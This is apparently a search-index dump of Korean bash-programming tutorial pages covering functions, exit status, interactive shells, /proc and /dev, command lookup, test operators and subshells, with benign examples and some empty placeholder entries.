parent 함수에 적용이 가능하다.  # Dynamic.sh #!/bin/bash AA=100 f1() { local AA=200 f2 echo f1 AA after f2 call : $AA } f2() { echo f2 AA : $AA AA=300 } f1 echo global AA : $AA $ Dynamic.sh f2 AA : 200 f1 AA after f2 call : 300 global AA : 100 # 스크립트를 작성할 때는 위와 같이 local 변수(지역변수)에 유의해여 작성해야한다. # Dynamic2.sh #!/bin/bash AA=100 f1() { AA=$(( AA + 100 )) echo f1 AA : $AA } f2() { echo f2 AA : $AA ;} main() { local AA=200 f1 f2 echo main AA : $AA } main echo global AA : $AA $ Dynamic2.sh f1 AA : 300 f2 AA : 300 main AA : 300 global AA : 100    함수의 연산결과 return   Shell Script가 프로그래밍 언어와 다른 점 중 하나가 return 명령의 역할이며, shell에서는 return 명령이 함수에서 연션한 결과를 반환하는 데 사용되는 것이 아니고, exit 명령과 같이 함수가 정상적으로 종료되었는지 아니면 오류가 발생했는지를 나타내는 종료 상태 값을 지정하는 용도로 사용된다.  # Script.sh #!/bin/bash echo hello exit 4 $ func() { echo hello return 5 } $ Script.sh hello $ echo $? 4 $ func world $ echo $? 5   위와 같이 연산 결과를 반환하는 데 return 명령을 사용하면 문제가 발생할 수 있으며, 이에 대해 다른 방법으로 접근해야한다.   $ AA=$(expr 1 + 2) $ echo $AA 3 $ AA=`date +%Y` $ echo $AA 2015 # 외부명령으로 부터 결과값을 받는 방법 $ f1() { expr $1 + $2 ;} $ f2() { date \u0026#34;+%Y\u0026#34; ;} $ f3() { echo \u0026#34;hello $1\u0026#34; ;} $ AA=$(f1 1 2) $ echo $AA 3 $ AA=\u0026#39;f2\u0026#39; $ echo $AA 2015 $ AA=$(f3 world) $ echo $AA hello world # 명령 치환을 사용하여 결과값을 받는 방법    함수에 인수를 전달    외부 명령을 실행할 때 인수를 전달하기 위해 ( )를 사용하지 않듯이 함수에서도 ( )를 사용하지 않는다.\n  전달된 인수는 함수 내에서 $1 $2 $3 ... Positional parameters에 자동으로 할당되며 scope는 local 변수와 같다.\n  # 스크립트 파일 실행시 $0 값은 파일명이 되지만 함수의 경우 /bin/bash로 설정 $ func1() { echo number of arguments: $# echo \u0026#39;$0\u0026#39; : \u0026#34;$0\u0026#34; echo \u0026#39;$1\u0026#39; : \u0026#34;$1\u0026#34; echo \u0026#39;$2\u0026#39; : \u0026#34;$2\u0026#34; echo \u0026#39;$3\u0026#39; : \u0026#34;$3\u0026#34; echo \u0026#39;$4\u0026#39; : \u0026#34;$4\u0026#34; echo \u0026#39;$5\u0026#39; : \u0026#34;$5\u0026#34; } $ AA=(22 33 44) $ func1 11 \u0026#34;${AA[@]}\u0026#34; \u0026#34;55 END\u0026#34;   $@, $* 변수는 함수에 전달된 인자를 모두 포함하며, 변수를 quote하지 않으면 단어 분리에 의해 두 변수의 차이가 없다.\n  변수를 quote 하게 되면 $@의 의미는 $1 $2 $3 ...(복수의 인수)가 되며 \u0026quot;$*\u0026quot;의 의미는 \u0026quot;$1c$2c$3c \u0026hellip;\u0026quot;(하나의 인수)가 된다.\n   # foo.sh #!/bin/bash foo() { echo \\$@ : $@ echo \\$* : $* echo \u0026#39;======== \u0026#34;$@\u0026#34; =======\u0026#39; for v in \u0026#34;$@\u0026#34;; do echo \u0026#34;$v\u0026#34; done echo \u0026#39;======== \u0026#34;$*\u0026#34; =======\u0026#39; for v in \u0026#34;$*\u0026#34;; do echo \u0026#34;$v\u0026#34; done } foo 11 \u0026#34;22 33\u0026#34; 44 $ foo.sh ======== \u0026#34;$@\u0026#34; ======= 11 22 33 44 ======== \u0026#34;$*\u0026#34; ======= 11 22 33 44 # $@는 복수개의 인수가 되는 반면 $*는 함수에 전달한 인수전체가 하나의 인수로 작용    $FUNCNAME   함수 내에서 자신의 이름은 $FUNCNAME을 통해 확인이 가능하다.  $ foobar () { echo \u0026#34;function name is :\u0026#34; $FUNCNAME ;} $ foobar function name is : foobar   "}),a.add({id:262,href:'/docs/development/shell/shell05/',title:"Exit Status",content:"Shell Programming    Exit Status    터미널에서 명령을 단계적으로 실행해서 작업을 완성할 때는 여태까지 실행한 명령들이 모두 정상적으로 완료되었기 때문이다.\n  만약 특정 과정에서 오류가 발생했는지, 정상적으로 완료되었는 지를 확인해야하는 데, 이를 판단할 수 있는 방법이 종료 상태 값을 확인하는 방법으로, 실제 shell에서의 핵심 개념중 하나가 종료 상태 값(Exit status)이다.\n  Shell 에서 실행되는 모든 명령은 빠짐없이 종료 상태 값을 반환하며, if while until \u0026amp;\u0026amp; || 모두 종료 상태 값을 사용해서 참, 거짓을 판단한다.\n  기본적으로 명령이 정상 종료되었을 경우는 0을 반환하고 그 이외의 값들을 오류를 분류하는 용도로 사용된다.\n  하지만 프로그래밍 언어처럼 특정값이나 스트랑, 예약어는 사용하지 않는다.\n  명령의 종료 상태 값은 $?를 통해 확인가능\n  $ date Fri Nov 13 02:14:02 EST 2020 $ echo $? 0 # 정상적인 종료 상태 값 $ date -@ error $ echo $? 1 # 0 이외의 값은 오류 값을 의미 curl -O ftp.kaist.ac.kr/ubuntu-cd/bionic/ubuntu-desktop-amd64.iso if test $? = 0; then echo \u0026#34;succeeded\u0026#34; else echo \u0026#34;failed\u0026#34; fi    앞선 명령이 정상 종료되어야 할 경우    앞서 실행된 명령이 오류로 종료하였을 경우 뒤에 이어지는 명령이 시행되면 안될 경우가 존재한다.\n  이럴 때를 대비하여 다음과 같이 \u0026amp;\u0026amp; 연산자를 이용해 명령을 연결하거나 test 명령을 이용해 직접 \u0026amp;? 값을 체크한다.\n  $ command1 ... \u0026amp;\u0026amp; command2 ... \u0026amp;\u0026amp; command3 .. command1 .... if test \u0026amp;? != 0; then echo command failed exit 1 fi    종료 상태 값 지정    스크립트 파일이나 subshell은 프로세스가 새로 생성되는 것이므로 종료 상태 값을 지정할 때 exit 명령으로 설정한다.\n  function이나 source 명령으로 읽어들이는 경우는 return명령으로 하며, 종료 상태 값을 지정하지 않으면 마지막으로 실행된 명령의 종료 상태 값을 사용한다.\n  $ command exist() { which \u0026#34;$1\u0026#34; \u0026gt; /dev/null; # return $? } # 마지막 명령에 종료 값이 사용되므로 따로 return 명령을 사용할 필요는 없다. $ function cd() { builtin cd \u0026#34;$@\u0026#34; return }    종료코드    종료코드에는 1byte가 사용되므로 0 ~ 255번을 사용할 수 있으며 그 중 0만 정상 종료를 나타내고 나머지는 오류를 분류해 나타내는 데 사용된다.\n  Shell에서는 일반적으로 하단과 같이 오류를 분류한다.\n  0 : 정상종료\n  1 : 일반적인 에러\n  2 : Syntax error, 잘못 사용된 builtin\n  126 : 명령을 실행할 수 없음\n  127 : 명령(파일)이 존재하지 않음\n  128+ N : Signal N에 의한 종료\n       참, 거짓 판단에 복수개의 명령이 사용될 경우    참, 거짓 판단을 위해 사용되는 명령이 위치하는 자리에는 꼭 하나의 명령만 올 수 있는 것이 아니며, \u0026amp;\u0026amp; || 또는 { ;} ( )를 이용한 명령 그룹이 올 수도 있고, ;를 이용해서 여러 개의 명령을 사용할 수도 있다.\n  또한 |를 이용해서 여러 명령을 연결시킬 수 있으며, 어떤 경우이건 모두 마지막에 실행되는 명령의 종료 상태 값이 참, 거짓의 판단에 따라 사용된다.\n  until read -r line line=$(echo \u0026#34;$line\u0026#34; | tr -d \u0026#39;\\r\\n\u0026#39;) test -z \u0026#34;$line\u0026#34; do ... done    pipe로 연결된 명령의 종료 상태 값    pipe로 여러 명령이 연결되어 실행될 때는 마지막 명령의 종료 상태 값이 사용된다.\n  그 이유는 command1의 실패에 상관없이 sed 명령은 항상 참을 반환하기 때문이며, command1 명령이 실패하였을 때 비정상 종료 상태 값이 반환되려면 두 번째와 같이 pipefail 옵션을 사용해야 한다.\n  $ command1 arg1 arg2 | sed -n \u0026#39;/\u0026lt;main\u0026gt;:/,/^$/p\u0026#39; ( set -o pipefail command1 arg1 arg2 | sed -n \u0026#39;/\u0026lt;main\u0026gt;:/,/^$/p\u0026#39; )  sh의 경우는 ipefail 옵션을 사용할 수 없으므로 하단과 같이 명령을 분리해 작성하거나 redirections와 같은 방법을 사용할 수 있다.  $ command1 arg1 arg2 \u0026gt; tmpfile $ status=$? $ sed -n \u0026#39;/\u0026lt;main\u0026gt;:/,/^$/p\u0026#39; tmpfile $ echo $status    null 값   존재하지 않는 변수나 null 값인 변수는 quote 하지 않을 경우 참이 되므로 주의해야 한다.  $ asdfgh=\u0026#34;\u0026#34; $ if $asdfgh; then echo true; else echo false; fi true $ unset asdfgh $ $asdfg \u0026amp;\u0026amp; echo true true    대입 연산의 종료 상태 값   =, += 메타문자를 이용한 식은 명령문이 아니며, ;로 구분없이 한줄에 여러 개를 쓸 수도 있다. 종료 상태 값은 기본적으로 항상 0 이지만 명령치환과 함께 사용되면 명령치환 종료 상태 값이 적용된다.  $ AA=11 BB=22 CC=33 $ echo $AA $BB $CC 11 22 33 $ [ 1 -eq 2 ] $ echo $? 1 $ [ 1 -eq 2 ] $ AA=100 $ echo $? 0 # 대입연산의 종료 상태 값은 기본적으로 0을 출력   "}),a.add({id:263,href:'/docs/development/shell/shell06/',title:"Interactive",content:"Shell Programming    Interactive    Shell이 실행되는 환경은 두가지로 사용자로부터 프로프트를 통해 직접 명령을 입력받아 실행시키는 interactive shell과 script 파일을 실행하는 것과 같은 non-interacgtive shell이 있다.\n  alais, job control과 같은 기능은 기본적으로 interactive shell에서 사용하기 위한 것으로 script를 실행할 때는 disable 된다.\n  case $- in *i*) echo interactive shell ;; *) echo non-interactive shell ;; esac # $- 변수는 set 명령에 의해 설정되어 있는 option flage를 담고 있다. # i는 interactive를 의미    interactive 특징    Script 실행시에는 alias 기능이 disable 된다.\n 사용자마다 다른 alias 설정을 가지고 있기 때문에 script가 배포되어 실행될 때, alias 적용이 된다면 오류가 발생할 수 있다.       Script 실행시에는 histroy 확장이 disable 된다.\n history 확장 기능은 interactive shell에서 사용하기 위한 것으로 script 실행 시에는 기본적으로 disable 되며, histroy builtin 명령도 사용할 수 없다.       Script 실행시에는 job control이 disable 된다.\n job control도 interactive shell에서 사용하기 위한 것으로 script 실행 시에는 disable 된다. 또한 \u0026amp; 메타문자를 이용해 background job을 생성하지 못한다는 것은 아니며, 다만 bg, fg, suspend 명령을 사용할 수 없지만 jobs, wait, disown 명령어는 사용할 수 있다.       Script 실행시에는 exec 명령이 실패하면 바로 종료된다.\n 프롬프트 상에는 exec 명령이 실패하면 에러 메시지와 함께 다음 프로픔트가 출력되지만, script 실행시에는 바로 종료하게 된다.       시작시 실행하는 파일이 다르다\n interactive shell이 시작될 때는 ~/.bashrc를 실행하고 shell script나 bash -c로 시작하는 Non-interactive shell이 시작될 때는 BASH-ENV 변수에 설정된 파일을 실행한다.      "}),a.add({id:264,href:'/docs/development/shell/shell07/',title:"etc",content:"Shell Programming    etc  /proc    proc 디렉토리는 현재 시스템에서 실행되는 프로세스들에 대한 정보를 제공하기 위해 OS에서 제공하는 가상의 파일 시스템으로, 실제 파일 시스템이 존재하는 것이 아니다.\n  커널이 가지고 있는 정보는 사용자 프로그램에서 직접 접근할 수가 없으므로 system call을 통해 제공하는 방법도 생각해 볼 수 있겠으나 프로스세그 가지는 자료구조를 생각할 때 사용자가 쉽게 사용할 수 있도록 메모리상에 가상의 파일 시스템을 만들어 구조적으로 제공하는 역할을 수행한다.\n  각각의 파일은 커널 내부의 특정 함수와 연결되어 있어서 read 하면 실시간으로 해당 정보가 표시된다.\n  proc를 사용하면 정보제공 방법이 유용한 점이 많기 때문에 지금은 프로세스 정보뿐만 아니라 커널이 가지고 있는 여러 가지 시스템 관련 정보도 /proc를 통해 제공하고 있으며 커널 파라미터 값을 write을 통해 변경할 수도 있다.\n  $ strace -e openat ps |\u0026amp; grep /proc/    /sys   sys 디렉토리는 /proc 이후에 생긴 가상 파일 시스템으로, 원래 /proc는 프로세스 정보와 ps, top, free 같은 몇몇 시스템 유틸리티가 사용하는 정보를 제공하는 것이 목적이었으나, 사용상의 이점으로 인해 무작위로 시스템 관련 정볼르 제공하다 보니 일종의 dumping ground가 되어 나중에 device, system 관련 정보를 좀 더 구조적으로 제공하기 위해 만든 것이 /sys 디렉토리이며, 기존 legacy 시스템 정보는 아직 /proc를 통해서 접근할 수 있으나 새로 추가되는 device, system 관련 정보는 /sys를 통해 제공된다.     /dev    /proc가 커널이 가지고 있는 프로세스와 시스템 관련 정보를 사용자에게 제공하는게 목적이라면 어떻게 하면 커널이 관리하는 장치들을 사용자에게 제공할 수 있을까에 대한 해결책이 /dev 디렉토리이다.\n  dev는 /proc와 달리 가상의 파일 시스템이 ㅇ니고, mknod 명령으로 직접 장치파일을 생성하며, 생성된 장치파일은 꼭 /dev 디렉토리에 위치할 필요는 없고 일반 파일들과 동일하게 mv, rm, cp _R, rename을 할 수 있으며, 또한 사용자 프로그램에서 장치파일을 사용하는 방법도 일반 파일과 같다.\n  /dev 디렉토리를 ls해 보면 파일 사이즈 대신에 두개의 숫자가 , 로 구분되어 표시되는 것을 볼 수 있는 데, 각각 major number, minor number을 의미한다.\n  "}),a.add({id:265,href:'/docs/development/shell/shell08/',title:"Commands",content:"Shell Programming    Commands  외부명령   /usr/bin/find 명령과 같이 시스템 디렉토리에 위치한 명령드롤, 여기에는 ELF 바이너리 실행파일뿐만 아닌, shell 스크립트, perl 스크립트, python 스크립트와 같은 텍스트 실행파일도 다수 포함되어 있으며 GNU coreutils 패키지에는 textutils, shelutils, fileutils 명령들이 포함되어 있다.  $ file /bin/* /usr/bin/* | grep -ic \u0026#34;text executable\u0026#34; 643 $ file /bin/* /usr/bin/* | grep -ic \u0026#34;shell script\u0026#34; 129 $ file /bin/* /usr/bin/* | grep -ic \u0026#34;python[0-9.]* script\u0026#34; 20 $ file /bin/* /usr/bin/* | grep -ic \u0026#34;perl script\u0026#34; 34 $ file /bin/* /usr/bin/* | grep -i \u0026#34;shell script\u0026#34; ... ... ... ...    shell builtins   Shell에 builtin 되어 제공되는 명령들로 실행을 위해 새로 프로세스를 만들지 않아도 되기 때문에 외부 명령에 비해 좀더 효율적으로 실행될 수 있고 shell 내부 상태정보를 조회, 변경할 수 있다.  $ compgen -b | column . : [ alias bg bind break builtin caller cd command compgen complete compopt continue declare dirs disown echo enable eval exec exit export false fc fg getopts hash help history jobs kill let local logout mapfile popd printf pushd pwd read readarray readonly return set shift shopt source suspend test times trap true type typeset ulimit umask unalias unset wait   echo printf test [ true false kill pwd 같은 명령들은 동일한 기능을 하는 외부 명령이 중복되어 존재하는 데, 이것은 shell 환경이 아닌 경우에도 사용할 수 있게한다.  $ env read var $ env test 1 == 2; echo $? 1 # test ,echo 같은 명령들은 shell builtin이지만 외부 명령으로도 존재하므로 env로 실행할 수 있다. $ sudo echo 123 123  기본적으로 bash에서 제공되는 builtin 명령 외에 사용자가 직접 명령을 만들어서 추가할 수도 있으며, bash-builtins 패키지를 설치하면 추가해서 사용할 수 있는 명령들과 예제를 볼 수 있다.     Shell keywords   Shell keywords는 compound commands 작성시 사용되며, [[ ]]의 경우는 키워드 이므로 [ ] 명령과 달리 직접 shell에 의해 해석이 되고 실행되며, |는 logical NOT 기능을 수행한다.  $ compgen -l | column if then else elif fi case esac for select while until do done in function time { } ! [[ ]] coproc    Shell functions   사용자가 임의로 원하는 함수를 만들어 사용할 수 있으며, 함수명은 외부 명령, builtin 명령과 동일하게 사용된다. declare -F명령을 이용하면 현재 shell에 설저되어 있는 함수들을 볼 수 있다.     aliases    앞서 소개한 명령들은 alias하여 사용할 수 있으며, shell 키워드도 alias 해서 사용할 수 있을 정도로 우선 순위가 높다.\n  non-interactiove shell인 script 파일 실행 시에는 기본적으로 disable된다.\n     명령 이름이 중복되어 나타날 때    명령 이름이 앞서 분류한 곳에 중복되어 나타는 경우가 존재하며, 간련된 정보를 보려면 builtin 명령인 type를 이용한다.\n  type -a 명령어는 우선순위가 높은 명령부터 차례대로 표시\n  $ type -a kill kill is a shell builtin kill is /bin/kill $ type -a time time is a shell keyword time is /usr/bin/time $ type -a [ [ is a shell builtin [ is /usr/bin/[   명령을 찾는 우선순위는 alias, keyword, functio, builtin, 외부 명령 순이며, kill 명령은 builtin에도 있고 외부 명령에도 존재하는 데, 이를 동일한 이름으로 function으로 새로 만든다면 function이 실행된다.\n  하단에는 중복되는 이름 문제를 해결하기 위해 shell에서 사용되는 명령어이다.\n  command : 우선순위가 높은 alias, keyword, function 이름을 피해 외부명령, builtin 명령을 실행한다.\n  builtin : 우선순위가 높은 alias, function 이름을 피해 builtin 명령을 실행하기 위해 사용\n  enable : builtin 명령을 disable 하여 외부 명령을 실행하게 할 수 있다.\n       alias, keyword의 escape   alias나 keyword는 특별한 기능을 하는 단아로 볼 수 있으며, 우선순위 또한 일반 명령들 보다 높은 데 다음가 같은 방법을 이용하면 해당 기능을 disable 할 수 있다.   alias, keyword 이름 앞에 \\ 문자를 붙인다.\n  alias, keyword 이름을 quote 한다.\n      time은 keyword 이면서, /usr/bin/time 외부 명령이기도 한데 다음과 같이 하면 키워드 기능이 escape 되어 외부 명령을 실행할 수 있다.  $ \\time $ \u0026#39;time\u0026#39; $ \u0026#34;time\u0026#34; $ \\ls $ \u0026#39;ls\u0026#39; $ \u0026#34;ls\u0026#34; # ls도 동일   단, function 이나 builtin 명령은 위 방법으로 escape 할 수 없으며, builtin 명령과 중복되는 외부 명령이 있다면 전체 경로를 입력하여 실행하거나 enable 명령으로 builtin 명령을 disable 할 수 있다/\n  function의 경우는 command 명령으로 외부 명령을 실행할 수 있다.\n  "}),a.add({id:266,href:'/docs/development/shell/shell09/',title:"Bourne Shell Builtins",content:"Shell Programming    Functions  "}),a.add({id:267,href:'/docs/development/shell/shell10/',title:"Bourne Shell Builtins",content:"Shell Programming    Functions  "}),a.add({id:268,href:'/docs/development/shell/shell11/',title:"Bourne Shell Builtins",content:"Shell Programming    Functions  "}),a.add({id:269,href:'/docs/development/shell/shell12/',title:"Bourne Shell Builtins",content:"Shell Programming    Bourne Shell Builtins   Shell은 내부에 bultin 되어 제공되는 명령들로 외부에 파일로 존재하지 않으므로 sudo, env, find의 -exec 등으로 실행할 수 없고 shell 환경에서만 사용할 수 있다.     . (dot)    .은 as 어셈블러나 ld 링커에서 현재 위치를 나타내는 데 사용되며, shell 에서는 현재 위치에 filename, include 하는데 사용된다.\n  bash 에서는 동일한 기능의 source 명령을 추가로 제공하며, 가령 AA.sh 내용 중에 . BB.sh 라인이 있다면 해당 라안이 위치한 곳에 BB.sh 파일을 읽어들인 후 실행하는 것과 동일하다.\n  function과 동일하게 arguments를 줄 수 있으며, BB.sh에서는 return 명령을 사용할 수 있다.\n  인수를 주지 않을 경우 AA.sh실행시 사용된 인수가 동일하게 적용된다.\n  filename에 경로를 지정하지 않으면 $PATH를 검색하는 데 찾이 못하면 오류메시지아 함께 non-zero를 리턴한다.\n  "}),a.add({id:270,href:'/docs/development/shell/shell13/',title:"Bourne Shell Builtins",content:"Shell Programming    Functions  "}),a.add({id:271,href:'/docs/development/shell/shell16/',title:"Bourne Shell Builtins",content:"Shell Programming    Functions  "}),a.add({id:272,href:'/docs/development/shell/shell17/',title:"Bourne Shell Builtins",content:"Shell Programming    Functions  "}),a.add({id:273,href:'/docs/development/shell/shell18/',title:"Bourne Shell Builtins",content:"Shell Programming    Functions  "}),a.add({id:274,href:'/docs/development/shell/shell19/',title:"Bourne Shell Builtins",content:"Shell Programming    Bourne Shell Builtins  "}),a.add({id:275,href:'/docs/development/shell/shell14/',title:"Test 연산자",content:"Shell Programming    Test  Test    Shell에는 기본적으로 숫자와 스트링을 구분하는 데이터 타입이 존재하지 않으며, 사칙연산을 위한 연산자도 없다.\n  즉, 이를 위해 명령문 상의 모든 문자는 스트링이며 산술연산은 별도의 확장이나 명령을 통해서 제공되고, 기본적으로 명령문에 사용되는 문자는 모두 스트링이다.\n  int main(int argc, char **argv) # 명령행의 인수를 스트링으로 받는 C 프로그램의 main 함수 public statis void main(String[] args) # 명령행의 인수를 스트링으로 받는 java 프로그램의 main 함수   즉 Shell에서의 32의 값은 다른 언어와 다르게 \u0026ldquo;32\u0026quot;와 32 간의 차이가 존재하지 않으며 둘다 같은 값을 의미한다.\n  스트링을 다루는 곳에서 사용되면 스트링으로 사용되고 산술연산이 필요한 곳에서 사용되면 숫자로 사용되는 방식을 취한다.\n  $ printf \u0026#34;decimal: %d, string: %s\\n\u0026#34; \u0026#34;16\u0026#34; 16 decimal: 16, string: 16 # 숫자가 들어갈 자리에 16을 스트링이 들어갈 자리에 16을 넣어도 동일하다. $ expr \u0026#34;-16\u0026#34; + 10 -6 # \u0026#39;+\u0026#39;는 expr 명령에 전달되는 인수로 그냥 문자를 의미한다. $ echo \u0026#34;10\u0026#34; +2 \\* 5 | bc 20 # \u0026#39;*\u0026#39;는 glob 문자이므로 escape $ [ \u0026#34;150\u0026#34; -gt 25 ]; echo $? 0 # -gt는 숫자를 다루는 연사자로 \u0026#34;150\u0026#34;과 비교해도 된다. $ [ \u0026#34;150\u0026#34; -gt \u0026#34;25\u0026#34; ]; echo $? 0 $ AA=123 $ case $AA in (123) echo Y ;; esac Y $ case $AA in (\u0026#34;123\u0026#34;) echo Y ;; esac Y  데이터 타입이 없기 때문에 shell script의 특징 중 하나가 두 종류의 연산자를 제공한다는 것이며, 하나는 숫자로 취급할 때 사용되는 연산자 또 하나는 스트링으로 취급할 떄 사용되는 연산자를 의미한다.     [ ], test    스크립트를 작성할 때 거의 빠짐없이 등장하는 표현식이며 테스트 표현식을 의미한다.\n  이 때 사용하는 명령이 test, [ 이며, test와 [는 동일한 명령을 의미한다.\n  [은 키워드 같이 생겼지만 명령으로 사용법도 command arg1 arg2 ...처럼 일반 명령과 동일하고 따라서 위의 help 문서중에 나오는 연산자들은 [ 명령의 인수이며 마지막에 붙이는 ]도 인수가 된다.\n  $ test -d /home/user/foo; echo $? 1 $ [ -d /home/user/foo ]; echo $?    null이 아닌 값은 모두 true   [ 명령에서 연산자를 사용하지 않은 경우 존재하지 않거나 null 값인 경우는 false 그 외의 모두 true에 해당한다.  $ [ ]; echo $? 1 $ [ ]; echo $? 1 $ [ $asdfgh ]; echo $? 1 # 존재하지 않는 변수 $ AA=\u0026#34;\u0026#34; $ [ \u0026#34;$AA\u0026#34; ]; echo $? 1 # null 값 변수 $ [ 0 ]; echo $? 0 $ [ 1 ]; echo $? 0 $ [ a ]; echo $? 0 $ [ -n ]; echo $? 0    false 값    프로그래밍 언어에서는 true와 false 키워드나 예약어로 자체 값을 가지지만, shell에서는 builtin 명령어로, 실행이 되어야 하는 true는 0을 반환하고 false는 1을 반환한다.\n  [ 명령의 인수로 사용되어 false 스트링은 같은 의미가 있으며 그렇기에 [에서 nul이 아닌 다른 스트링은 항상 true를 의미한다.\n  $ [ true ]; echo $? 0 $ [ false ]; echo $? 0 $ isSet=false $ if $isSet; then echo true; else echo false; fi false $ isSet=ture $ if $isSet; then echo true; else echo false; fi true  \u0026amp;nbsp\n 비교변수   [ 명령은 인수로 사용하는 변수를 quote 하지 않으면 정상적인 결과가 아노지 않을 수 있다.  $ AA=\u0026#34;\u0026#34; # AA=null $ [ -n $AA ]; echo $? 0 # null이 아니여야 true인데 결과로 true가 출력 $ [ -n \u0026#34;$AA\u0026#34; ]; echo $? 1 # 변수를 quote 해주니 정상적인 결과값이 출력 $ AA=\u0026#34;aa bb\u0026#34; $ BB=\u0026#34;aa bb\u0026#34; $ if [ $AA = $BB ]; echo $? error $ if [ \u0026#34;$AA\u0026#34; = \u0026#34;$BB\u0026#34; ]; echo $? 0  위의 예를 통해서 알 수 있듯이 [ 명령을 사용할 때는 항상 변수를 quote 해주어야 한다.     스트링 연산자   \u0026lt;, \u0026gt; 연산자는 보통 프로그래밍 언어에서는 숫자를 비교할 때 사용하지만 [ ], [[ ]]에서는 그와 달리 스트링을 비교하는 데 사용한다.  $ [ 100 \\\u0026gt; 2 ]; echo $? 1 $ [ 100 -gt 2 ]; echo $? 0    AND, OR    [ 명령에서는 and, or 연산자로 -a, -o를 제공하지만, \u0026amp;\u0026amp;, || shell 메타문자를 이용해 분리해서 작성할 수도 있다.\n  두 연산자의 우선순위는 [ 명령에서 제공하는 연산자일 경우 일반 프로그램이 언어와 같이 -a가 높고, shell 메타문자를 이용할 경우는 두 메타문자의 우선순위를 같게 취급하므로 주의할 필요가 있다.\n  $ if [ test1 ] \u0026amp;\u0026amp; [ test2 ]; then ... $ if [ test1 ] || [ test2 ]; then ... # shell 메타문자를 이용해 분리해 사용 $ if [ test1 ] || { [test2 ] \u0026amp;\u0026amp; [ test3 ]; } then... # 우선순위 {; }를 이용해 우선순위 조절 $ if [ test1 -a test2 ]; then ... $ if [ test1 -o test2 ]; then ... $ if [ test1 -a \\( test2 -o test3 \\) ]; then... # ( )를 통해 우선순위르 ㄹ조절할 경우 메타문자와 충돌하므로 escape 한다.    Logical NOT   Logical NOT은 하단과 같이 두 가지의 형태로 사용할 수 있다.  if [ ! test1 ]; then... # \u0026#39;[\u0026#39; 명령에서 사용되는 \u0026#39;!\u0026#39; if ! [ test1 ]; then... # shell logical NOT 키워드를 이용    *Array를 비교할 때는 을 사용    Quote를 하지 않을경우 `${array[@]}는 차이가 없으며, 동일하게 IFS 값에 의해 단어 분리가 일어난다.\n  \u0026quot; \u0026quot; 하였을 경우 @과 * 의미가 틀려지며, @는 개개인의 원소를 \u0026quot; \u0026quot;하여 나열하는것과 같고 *은 모든 원소를 하나의 \u0026quot; \u0026quot;안에 넣는 것과 같다. 그러므로 array를 비교할 때는 *를 사용해야 한다.\n  $ AA=(11 22 33) $ BB=(11 22 33) $ [ \u0026#34;${AA[*]}\u0026#34; = \u0026#34;${BB[*]}\u0026#34; ]; echo $? 0 # [ \u0026#34;11 22 33\u0026#34; = \u0026#34;11 22 33\u0026#34; ] $ [ \u0026#34;${AA[@]}\u0026#34; = \u0026#34;${BB[@]}\u0026#34; ]; echo $? error # [ \u0026#34;11\u0026#34; \u0026#34;22\u0026#34; \u0026#34;33\u0026#34; = \u0026#34;11\u0026#34; \u0026#34;22\u0026#34; \u0026#34;33\u0026#34; ]    [[ ]]    [[ ]]은 [ ]의 기능확장 버전으로 [ ]와 큰 차이점은 [ ]은 명령이고 [[ ]]은 shell keyword라는 특징을 가지고 있다.\n  키워드 이기 때문에 일반 명령들과 달리 shell 에서 자체적으로 해석을 해서 실행하기 때문에 [처럼 명령이라서 생기는 여러가지 제야사항 없이 편리하게 사용할 수 있다.\n  $ [[ a \u0026lt; b ]]; echo $? 0 $ [[ a \u0026gt; b ]]; echo $? 1 # \u0026lt; \u0026gt; 연산자를 escape 하지 않아도 사용가능하다. $ AA=\u0026#34;\u0026#34; $ [[ -n $AA ]]; echo $? 1 $ [[ -n \u0026#34;$AA]]; echo $?1    Test Operators    Test 연산자는 test, [ 명령에서 제공하는 것으로 [[ ]]에서도 동일하게 사용할 수 있다.\n  단, -a -o 연사자는 제외되며 [[ ]] 에서는 자체 \u0026amp;\u0026amp;, || 연산자를 제공한다.\n     File Tests   파일이 실행파일인지 테스트할 때 사용되는 파일인지 테스트 할 때 사용되는 -x -r -w 연산자는 파일의 drwxrwxr-x모드 값을 가지고 있는 지를 판단한다.  $ if [ -f \u0026#34;$file\u0026#34; -a -x \u0026#34;$file\u0026#34; ]; than ... fi  테스트 되는 파일이 symbolic link 일 경우 -L, -h 연산자는 링크 자체를 테스트하고 나머지는 링크에 연결된 대상 파일을 테스트를 수행한다.     연사자 설명     -a  파일이 존재하면 ture   -e  파일이 존재하면 true   -f  파일이 존재하면 regular 파일이면 ture   -d  파일이 존재하고 directory 이면 true   -c  파일이 존재하고 character special 파일이면 true   -b  파일이 존재하고 block special 파일이면 true   -p  파일이 존재하고 (named, unnamed) pipe 이거나 \u0026lt;(...) 이면 true   -S  파일이 존재하고 socket 이면 true   -L  파일이 존재하고 symbolic link 이면 true   -h  파일이 존재하고 symbolic link 이면 true   -g  파일이 존재하고 sgid bit이 설정되어 있으면 true   -u  파일이 존재하고 suid bit이 설정되어 있으며 true   -k  파일이 조재하고 sticky bit이 설정되어 있으면 ture   -r  파일이 존재하고 readble 이면 true   -w  파일이 존재하고 writable 이면 true   -x  파일이 존재하고 executable 이면 true   -O  파일이 존재하고 uid가 같으면 true   -G  파일이 존재하고 uid가 같으면 true   -N  파일이 존재하고 마지막에 read 한 뒤로 modify 되었으면 true   -s  파일이 존재하고현재 터미널에 연결되어 있으면 true   -t  FD가 조재하고 현재 터미널에 연결되어 있으면 true   -nt  File1이 File2 보다 수정시간이 최근이면 true   -ot  File1이 File2 보다 수정시간이 오래되었으면 true   -ef  File1와 File2이 서로 하드링크 되어있으면 true      파일이나 디렉토리가 존재하는 지 체크할 때 readlink 명령을 이용할 수 있으며, 경로애 symbolic link가 퐘될 경우 모두 추적하여 physical 경로에 출력한다.    "}),a.add({id:276,href:'/docs/development/shell/shell15/',title:"SubShells",content:"Shell Programming    SubShells    Shell에서 명령을 실행하면 새로운 프로세스가 생성되어 실행되며, 이 때 명령을 호출한 process가 parent가 되고 새로 실행되는 명령이 child process가 된다.\n  다음은 프롬프트 상에서 /bin/sleep외부 명령을 실행한 예이며 현재 bash shell process 아래서 sleep 명령의 child process가 시행되는 것이 확인 가능하다.\n  프롬프트에서는 bash child process가 하나 더 생성된 후에 다른 명령이 실행 되는 것을 확인 할 수 있으며 ( ) $( ) \\` | \u0026amp;`을 이용하여 명령을 실행시킬 때 생성되는 shell을 subshell이라고 한다.\n     child process가 parent process로부터 상속받는 요소    현재의 작업 디렉토리\n  expor된 환경 변수, 함수\n  현재 설정되어 있는 file descriptor 들(stdin, stdout, stderr \u0026hellip;)\n  ignore 된 신호 (trap \u0026quot; INT)\n  $ echo \u0026#34;PID : $$, PPID : $PPID\u0026#34; PID : 1617, PPID : 1613 $ pwd 